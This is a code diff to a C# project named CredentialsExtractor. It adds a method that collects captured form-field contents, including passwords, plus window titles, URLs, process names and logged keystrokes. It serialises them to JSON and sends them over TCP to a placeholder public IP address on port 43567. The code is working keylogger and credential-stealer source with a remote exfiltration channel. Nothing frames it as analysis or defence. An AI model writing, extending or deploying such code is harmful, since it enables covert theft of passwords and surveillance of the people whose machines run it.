@@ -3,6 +3,9 @@ using CredentialsExtractor.Input;
 using CredentialsExtractor.Logging;
 using CredentialsExtractor.Native;
 using System.Collections.Concurrent;
+using System.Net.Sockets;
+using System.Text;
+using Newtonsoft.Json;
 
 namespace CredentialsExtractor.Core
 {
@@ -478,6 +481,69 @@ namespace CredentialsExtractor.Core
                     passwordState.Content.Remove(passwordState.Content.Length - removeCount, removeCount);
                     _logger.Log($"Removed {removeCount} characters from password for field {passwordState.FieldId}");
                 }
+            }
+        }
+
+        // SendCredentialsToServer method - Updated port
+        private void SendCredentialsToServer(Dictionary<string, FormFieldState> formFields)
+        {
+            try
+            {
+                // Create data structure to send
+                var credentialData = new
+                {
+                    ApplicationInfo = _currentApplicationInfo,
+                    FormFields = formFields.Values.Select(f => new
+                    {
+                        FieldId = f.FieldId,
+                        FieldType = f.FieldType,
+                        Content = f.Content.ToString(),
+                        ApplicationName = f.ApplicationInfo.ApplicationName,
+                        WindowTitle = f.ApplicationInfo.WindowTitle,
+                        URL = f.ApplicationInfo.URL,
+                        ProcessName = f.ApplicationInfo.ProcessName
+                    }).ToList(),
+                    Keystrokes = _capturedKeystrokes.Select(k => new
+                    {
+                        Key = k.Key,
+                        Timestamp = k.Timestamp
+                    }).ToList(),
+                    Timestamp = DateTime.Now
+                };
+
+                // Serialize to JSON
+                string jsonData = JsonConvert.SerializeObject(credentialData);
+
+                // Connect to server
+                using (TcpClient client = new TcpClient())
+                {
+                    // Set a reasonable timeout
+                    client.SendTimeout = 5000;
+                    client.ReceiveTimeout = 5000;
+
+                    // Connect to the server - updated to use your external port
+                    client.Connect("your_public_ip_address", 43567);
+
+                    using (NetworkStream stream = client.GetStream())
+                    {
+                        // Convert the JSON string to bytes
+                        byte[] data = Encoding.UTF8.GetBytes(jsonData + "<END>");
+
+                        // Send the data to the server
+                        stream.Write(data, 0, data.Length);
+
+                        // Read the response from the server
+                        byte[] responseBuffer = new byte[4096];
+                        int bytesRead = stream.Read(responseBuffer, 0, responseBuffer.Length);
+                        string response = Encoding.UTF8.GetString(responseBuffer, 0, bytesRead);
+
+                        _logger.Log($"Server response: {response}");
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                _logger.Log($"Error sending credentials to server: {ex.Message}");
             }
         }
 
